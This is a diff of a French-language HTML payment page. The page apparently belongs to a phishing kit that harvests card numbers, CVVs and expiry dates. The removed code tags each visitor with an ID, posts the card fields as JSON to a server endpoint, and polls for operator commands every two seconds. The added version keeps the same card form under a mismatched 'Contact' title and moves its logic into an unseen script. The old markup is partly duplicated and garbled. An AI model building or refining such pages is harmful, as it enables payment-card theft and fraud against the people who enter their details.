@@ -1,25 +1,24 @@
 <!DOCTYPE html>
-<html>
-<head><title>Paiement</title><script src="script.js"></script></head><!DOCTYPE html>
-<html>
-<head><title>Paiement</title><script src="script.js"></script></head>
-<body data-visitor-id="">
-<h1>Paiement</h1>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Contact</title>
+<script src="script.js" defer></script>
+<style>
+  body { font-family:sans-serif; padding:20px; max-width:600px; margin:auto; }
+  h1 { text-align:center; }
+  form { display:flex; flex-direction:column; gap:10px; margin-top:20px; }
+  input, button { padding:10px; font-size:1em; }
+  button { cursor:pointer; background-color:#2196F3; color:white; border:none; border-radius:5px; }
+</style>
+</head>
+<body>
+<h1>💳 Paiement</h1>
 <form id="paymentForm">
-  <input name="card" placeholder="Numéro carte" required>
-  <input name="cvv" placeholder="CVV" required>
-  <input name="expiry" placeholder="MM/AA" required>
-  <button type="submit">Suivant</button>
+  <input type="text" name="carte" placeholder="Numéro de carte" required>
+  <input type="text" name="expiration" placeholder="Date d'expiration MM/AA" required>
+  <input type="text" name="cvv" placeholder="CVV" required>
+  <button type="submit">Payer</button>
 </form>
-<script>
-const visitorId=document.body.dataset.visitorId;
-document.getElementById('paymentForm').onsubmit=e=>{
-  e.preventDefault();
-  const data={card:e.target.card.value,cvv:e.target.cvv.value,expiry:e.target.expiry.value};
-  fetch('submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId,type:'payment',data})});
-};
-setInterval(()=>fetchCommand(visitorId),2000);
-</script>
 </body>
 </html>
-
